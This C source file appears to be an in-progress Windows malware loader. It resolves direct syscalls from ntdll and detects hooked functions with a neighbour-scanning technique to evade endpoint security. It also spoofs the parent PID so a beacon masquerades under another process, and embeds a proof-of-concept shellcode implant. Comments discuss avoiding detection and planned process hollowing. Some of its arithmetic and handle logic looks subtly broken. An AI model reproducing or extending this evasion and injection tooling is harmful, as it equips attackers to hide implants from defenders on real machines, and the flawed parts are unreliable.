#include <windows.h>
#include <stdio.h>
// #include <winternl.h>
// #pragma comment(lib, "ntdll.lib")
#include"struct.h"

#define UP -32
#define DOWN 32

typedef struct _SYSCALL_ENTRY {
    LPVOID  pAddress;
    PCHAR   sName;
    WORD    wSystemCall;
} SYSCALL_ENTRY, * PSYSCALL_ENTRY;
typedef struct _SYSCALL_TABLE {
    SYSCALL_ENTRY   NtAllocateVirtualMemory;
} SYSCALL_TABLE, * PSYSCALL_TABLE;

extern VOID LoadSystemcall(WORD wSystemCall);
extern ExecuteSystemcall();

#define SystemProcessInformation 5
typedef __kernel_entry NTSTATUS (WINAPI * t_NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

// poc payload
unsigned char implant[] = 
    { 0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41,
    0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60,
    0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72,
    0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac,
    0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2,
    0xed, 0x52, 0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
    0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x6f,
    0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44, 0x8b, 0x40, 0x20, 0x49,
    0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01,
    0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01,
    0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
    0x75, 0xd6, 0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
    0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e, 0x41, 0x8b,
    0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58,
    0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12, 0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x3e, 0x48,
    0x8d, 0x8d, 0x24, 0x01, 0x00, 0x00, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5,
    0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x48, 0x8d, 0x95, 0x0e, 0x01, 0x00,
    0x00, 0x3e, 0x4c, 0x8d, 0x85, 0x1f, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba,
    0x45, 0x83, 0x56, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2,
    0x56, 0xff, 0xd5, 0x69, 0x6d, 0x70, 0x6f, 0x73, 0x74, 0x65, 0x72, 0x20, 0x69, 0x6d,
    0x70, 0x6c, 0x61, 0x6e, 0x74, 0x00, 0x69, 0x6e, 0x66, 0x6f, 0x00, 0x75, 0x73, 0x65,
    0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00 
};
unsigned int implant_size = sizeof(implant);


// process enumaeration `NtQuerySystemInfo` - SYSTEM_PROCESS_INFORMATION
// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FSystem%20Information%2FSYSTEM_INFORMATION_CLASS.html

// https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation
// has anti-debug / registery and system recon and other loads of functionality to use
// TODO: NtQuerySystemInformation class has a crypto functionality; needs to be checked - less use of popular crypto APIs | crypto code
/**
 * @brief object enumeration - system info gathering
 * __kernel_entry NTSTATUS NtQuerySystemInformation(
  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,
  [in, out]       PVOID                    SystemInformation,
  [in]            ULONG                    SystemInformationLength,
  [out, optional] PULONG                   ReturnLength
);
 * 
 * @return TBD
 */
DWORD get_target_proc_ppid(PWCHAR target_proc){

    DWORD pid = 0;

    // initial buffer to hold sysinfo class
    DWORD SysInfoBufferSize = 0;
    LPVOID SysInfoBuffer = NULL;
    SYSTEM_PROCESS_INFORMATION * SysInfoClass;

    t_NtQuerySystemInformation p_NtQuerySystemInformation;
    p_NtQuerySystemInformation = (t_NtQuerySystemInformation) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
    if(!p_NtQuerySystemInformation){
        printf("Loading NtQuerySystemInformation failed[%d]\n", GetLastError());
    } else {
        printf("Located export NtQuerySystemInformation at 0x[%p]\n", p_NtQuerySystemInformation);
    }

    // construct initial sysinfo struct
    p_NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS) SystemProcessInformation, NULL, 0, &SysInfoBufferSize);
    if(!SysInfoBufferSize){
        printf("p_NtQuerySystemInformation failed[%d]\n", GetLastError());
    } else {
        printf("SystemInfo Struct Buffer allocated at 0x[%p], size [%x]\n", &SysInfoBufferSize, SysInfoBufferSize);
    }

    // allocate heap for SysInfoClass
    if(SysInfoBufferSize){
        // HeapAlloc commits a READWRITE block, better than VirtualAlloc that tips off with PAGE_READWRITE flag.
        SysInfoBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SysInfoBufferSize);
        SysInfoClass = (SYSTEM_PROCESS_INFORMATION *) SysInfoBuffer;
        NTSTATUS nt_code = p_NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS) SystemProcessInformation,
                                                        SysInfoClass,
                                                        SysInfoBufferSize,
                                                        &SysInfoBufferSize);
        if(!nt_code){
            while(SysInfoClass->NextEntryOffset){
                printf("proc_name [%S]\n", SysInfoClass->ImageName.Buffer);
                if(lstrcmpiW(target_proc, SysInfoClass->ImageName.Buffer) == 0){
                    pid = (DWORD_PTR) SysInfoClass->UniqueProcessId;
                    break;
                } else {
                // check next entry
                    SysInfoClass = (SYSTEM_PROCESS_INFORMATION *) ((ULONG_PTR)SysInfoClass + SysInfoClass->NextEntryOffset);
                }
            }

        } else {
            printf("p_NtQuerySystemInformation process enumeration failed[%d]\n", GetLastError());
            return -2;
        }

    } else {
        printf("p_NtQuerySystemInformation initial Class alloc failed[%d]\n", GetLastError());
        return -1;
    }
    return pid;
}
// ppid spoofing
// masqurade beacon as svchost and spoof services.exe pid as ppid
// msdn example code for updating THREAD_ATTRIBUTE_LIST
// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute
HANDLE create_spoof_target(LPCSTR target_proc, DWORD spoofed_ppid){

/*    
    typedef struct _STARTUPINFOEXA {
    STARTUPINFOA                 StartupInfo;               
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;     
    } STARTUPINFOEXA, *LPSTARTUPINFOEXA;

AttributeList is an array of keys specific to the created process - 
    i think its dynamic as msdn specifies its size initialization with MAX _DWORD_ bit mask set?

one key is protection level mask setting the PROC_THREAD_ATTRIBUTE_PARENT_PROCESS bit

PROC_THREAD_ATTRIBUTE_PARENT_PROCESS is an lp to parent process handle to use
parent process must have a PROCESS_CREATE_PROCESS access right
*/

    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T AttributeListSize;

    ZeroMemory( &si, sizeof(STARTUPINFOEXA) );
    ZeroMemory( &pi, sizeof(pi) );
    si.StartupInfo.cb  = sizeof(STARTUPINFOEXA);
// protection level value for PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
    HANDLE hParent_spoofed = 0;
	
// initialize AttributeListSize
    InitializeProcThreadAttributeList( 
                                        NULL,                   // NULL as input to initalize
                                        1,                      // MAX count for dwAttributeCount _count of list attributes to update_ to get initial size
                                        0,                      // RESERVED - must be zero
                                        &AttributeListSize     // return AttributeListSize required size in bytes
                                    );

// allocate heap for AttributeList
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), 0, AttributeListSize);

    if(!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &AttributeListSize)){
        printf("InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &AttributeListSize) failed[%d]\n", GetLastError());
    }

// update si.lpAttributeList to hold the hParent_spoofed
    hParent_spoofed = OpenProcess(
                                    PROCESS_CREATE_PROCESS | PROCESS_SUSPEND_RESUME  | PROCESS_VM_OPERATION | PROCESS_VM_READ ,
                                    // PROCESS_ALL_ACCESS,    // is it too noisy?   
                                    FALSE,         // inherit handle
                                    (DWORD)spoofed_ppid  // spoofed parent pid
                                    );
    if(!hParent_spoofed){
        printf("OpenProcess failed[%d]\n", GetLastError());
    }

    UpdateProcThreadAttribute(
                        si.lpAttributeList,
                        0,
                        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                        &hParent_spoofed,
                        sizeof(HANDLE),
                        NULL,
                        NULL
                        );

    if(!CreateProcessA(
        NULL,                           // application name
        (LPCSTR) target_proc,             // commandline
        NULL,                           // process security attributes
        NULL,                           // thraed security attributes
        FALSE,                          // handle inheritence
        EXTENDED_STARTUPINFO_PRESENT ,               // creation flags - suspend main thread for injection - use extended MASKED si
        NULL,                           // use parent's environment block    // TODO: check to see changes in binary attributes
        NULL,                           // use parent's starting directory - //TODO: perfect to change dir attributes in binary signatures
        &si.StartupInfo,                // pointer to SPOOFED STARTUPINFO structure
        &pi                             // pointer to PROCESS INFORMATION structure
    )){
        printf("CreateProcessA failed[%d]\n", GetLastError());
    }
    // printf("Target Process [%s.exe] Created with pid [%d]\n", target_proc, pi.dwProcessId);
    // wait for process execution - till alerted / finished
    WaitForSingleObject(pi.hProcess, 10000);

// TODO: Manage HANDLE LEAKS!
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return pi.hProcess;

}

BOOL WINAPI hlp_GetProcAddrNtdll(PSYSCALL_ENTRY pSyscallEntry) {
    LPVOID pNtFunction = NULL;
    PVOID pNtdllBase = NULL;
    LPCWSTR sNtdll = L"ntdll.dll";
    LPCWSTR sModule = L"main.exe";

    PPEB_LDR_DATA Ldr_data;
    PLIST_ENTRY Ldr_module_list;
    PLDR_DATA_TABLE_ENTRY Ldr_module_entry;

    // get NTDLL base address
    // dereference (_TEB *)TEB->(_PEB *)PEB->(_PEB_LDR_DATA *)LoaderData->(_LDR_DATA_TABLE_ENTRY *)Ldr_data_entry
    // NtCurrentTeb()->ProcessEnvirtonmentBlock->LoaderData->InMemoryOrderModuleList

    Ldr_data = (PPEB_LDR_DATA)NtCurrentTeb()->ProcessEnvironmentBlock->LoaderData;
    Ldr_module_list = (PLIST_ENTRY)&Ldr_data->InMemoryOrderModuleList.Flink;
    /*
        LIST_ENTRY Ldr_module_list: linked_list of LIST_ENTRY Flink, Blink - treated as a pivot point for all modules
        PLDR_DATA_TABLE_ENTRY Ldr_module_list - sizeof(LIST_ENTRY): struct of _LDR_DATA_TABLE_ENTRY - modules specific fields

        [null, current_module, module_1, ..etc]

    */
    // loop through LIST_ENTRY structs
    // find NTDLL by FullDllName.Buffer
    Ldr_module_entry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Ldr_module_list - sizeof(LIST_ENTRY));
    // extract DllBase
    do
    {
        if (lstrcmpiW(Ldr_module_entry->BaseDllName.Buffer, sNtdll) == 0) {
            printf("Found [%ls]\n", Ldr_module_entry->BaseDllName.Buffer);
            printf("NTDLL at [%p]\n", Ldr_module_entry->DllBase);
            pNtdllBase = Ldr_module_entry->DllBase;
            break;
        }
        Ldr_module_list = Ldr_module_list->Flink;
        Ldr_module_entry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Ldr_module_list - sizeof(LIST_ENTRY));

    } while (Ldr_module_entry);

    // parse NTDLL headers
    // loop through EAT
    // find pNtFunction 
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pNtdllBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pNtdllBase + (BYTE)pDosHeader->e_lfanew);

    // EAT DataDirectory[0]
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pNtdllBase + pNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

    printf("NTDLL pEAT at [%p]\n", (LPVOID)pExportDirectory);

    PDWORD pAddressOfFunctions = (PDWORD)((PBYTE)pNtdllBase + pExportDirectory->AddressOfFunctions);
    PDWORD pAddressOfNames = (PDWORD)((PBYTE)pNtdllBase + pExportDirectory->AddressOfNames);
    PWORD pAddressOfNameOrdinals = (PWORD)((PBYTE)pNtdllBase + pExportDirectory->AddressOfNameOrdinals);

    // pENT[NumberOfNames]
    // pEAT[EOT[NumberOfNames]]
    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
        PCHAR pszFunctionName = (PCHAR)((PBYTE)pNtdllBase + pAddressOfNames[i]);
        LPVOID pFunctionAddress = (LPVOID)((PBYTE)pNtdllBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        // printf("[%s] at [%p]\n", pszFunctionName, pfunctionAddress);

        if (strcmp(pszFunctionName, pSyscallEntry->sName) == 0) {
            printf("[%s] at [%p]\n", pszFunctionName, pFunctionAddress);

            // load pSyscallEntry.pAddress
            pSyscallEntry->pAddress = pFunctionAddress;
            // check if api is hooked
            // if clean, load pSyscallEntry.wSystemCall
            // if not - halo's gate

            // First opcodes should be :
            //    MOV R10, RCX
            //    MOV RAX, <syscall> - [4 : 5]
            if (*((PBYTE)pFunctionAddress) == 0x4c
                && *((PBYTE)pFunctionAddress + 1) == 0x8b
                && *((PBYTE)pFunctionAddress + 2) == 0xd1
                && *((PBYTE)pFunctionAddress + 3) == 0xb8
                && *((PBYTE)pFunctionAddress + 6) == 0x00
                && *((PBYTE)pFunctionAddress + 7) == 0x00) {
                printf("Fresh [%s] at [%p]\n", pszFunctionName, pSyscallEntry->pAddress);

                // load pSyscallEntry.wSystemCall
                BYTE high = *((PBYTE)pFunctionAddress + 5);
                BYTE low = *((PBYTE)pFunctionAddress + 4);

                pSyscallEntry->wSystemCall = (high << 8) | low;
                printf("[%s] syscall is [%X]\n", pszFunctionName, pSyscallEntry->wSystemCall);

            }
            if (*((PBYTE)pFunctionAddress) == 0xe9) {
                printf("Hooked Syscall\n");
                for (WORD idx = 1; idx <= 500; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
                        && *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
                        && *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
                        && *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
                        && *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
                        BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
                        pSyscallEntry->wSystemCall = (high << 8) | low - idx;

                        return TRUE;
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
                        && *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
                        && *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
                        && *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
                        && *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
                        BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
                        pSyscallEntry->wSystemCall = (high << 8) | low + idx;

                        return TRUE;
                    }
                }
            }
        }
    }
    return TRUE;
}

// __kernel_entry NTSYSCALLAPI NTSTATUS NtAllocateVirtualMemory(
//   [in]      HANDLE    ProcessHandle,
//   [in, out] PVOID     *BaseAddress,
//   [in]      ULONG_PTR ZeroBits,
//   [in, out] PSIZE_T   RegionSize,
//   [in]      ULONG     AllocationType,
//   [in]      ULONG     Protect
// );

// process hollowing injection
// launch svchost.exe and inject beacon

// threadless execution - QueueAPC

int main(void){

    SYSCALL_TABLE syscall_table = { 0 };
    syscall_table.NtAllocateVirtualMemory.sName = "NtAllocateVirtualMemory";
    hlp_GetProcAddrNtdll(&syscall_table.NtAllocateVirtualMemory);

    printf("[%p] [%d]\n", syscall_table.NtAllocateVirtualMemory.pAddress, syscall_table.NtAllocateVirtualMemory.wSystemCall);
    // test NtAllocateVirtualMemory
    PVOID lpAllocatedAddress = NULL;
    SIZE_T sDataSize = sizeof(MAX_PATH);
    LoadSystemcall(syscall_table.NtAllocateVirtualMemory.wSystemCall);
    NTSTATUS status = ExecuteSystemcall(GetCurrentProcess(), &lpAllocatedAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);
    if (status) {
        printf("NtAllocateVirtualMemory failed[%d]\n", GetLastError());
    }
    printf("pAllocatedAddress at [%p]\n", lpAllocatedAddress);
    getchar();

    LPCSTR target_proc = "notepad";
    PWCHAR target_parent = L"explorer.exe";
    DWORD target_ppid = 0;
    HANDLE hTarget = 0;

    target_ppid = get_target_proc_ppid(target_parent);
    if(target_ppid){
        printf("Target Parent Process [%S] found, pid [%d]\n", target_parent, target_ppid);
    }
    hTarget = create_spoof_target(target_proc, target_ppid);
    if(hTarget){
        printf("Target Process [%s.exe], handle [%lld]\n", target_proc, (DWORD_PTR) hTarget);
    }
    return 0;
}